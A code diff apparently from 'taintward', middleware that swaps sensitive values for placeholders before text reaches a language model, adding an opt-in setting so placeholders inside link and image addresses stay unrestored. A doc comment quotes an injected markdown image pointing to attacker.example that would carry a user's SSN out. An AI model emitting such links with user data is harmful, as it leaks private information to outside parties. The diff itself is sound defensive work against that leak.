@@ -44,8 +44,16 @@ export interface TaintwardMiddlewareOptions {
    */
   map?: PlaceholderMap;
   /**
+   * Also restore placeholders inside link and image addresses (default false,
+   * or TAINTWARD_RESTORE_IN_URLS=1). Off, an injected
+   * ![x](https://attacker.example/?d=<SSN_1>) keeps the placeholder instead
+   * of carrying the real value out (gap G1). Ignored when `map` is given.
+   */
+  restoreInUrls?: boolean;
+  /**
    * Called after each answer with the placeholder forms the model rewrote
-   * (repaired), broke (lost) or invented (unknown). Never values. By default
+   * (repaired), broke (lost) or invented (unknown), and the ones left inside
+   * link addresses (blocked). Never values. By default
    * a warning is printed when something could not be restored.
    */
   onReport?: (report: RestoreReport) => void;
@@ -58,6 +66,9 @@ function defaultReport(r: RestoreReport): void {
     console.warn(
       `taintward: model answer has placeholders that could not be restored (lost: ${r.lost.slice(0, 5).join(", ")}; unknown: ${r.unknown.slice(0, 5).join(", ")})`,
     );
+  }
+  if (r.blocked.length) {
+    console.warn(`taintward: placeholders inside link addresses were not restored: ${r.blocked.slice(0, 5).join(", ")}`);
   }
 }
 
@@ -142,7 +153,7 @@ export function taintwardMiddleware(options: TaintwardMiddlewareOptions = {}): L
     specificationVersion: "v4",
 
     transformParams: async ({ params }) => {
-      const map = options.map ?? new PlaceholderMap();
+      const map = options.map ?? new PlaceholderMap({ restoreInUrls: options.restoreInUrls });
       const opts = usePlaceholders ? { placeholders: map } : {};
       const text: Redact = (s) => redactString(s, "llm", opts);
       const json: RedactJson = (v) => redactPayload(v, "llm", opts);
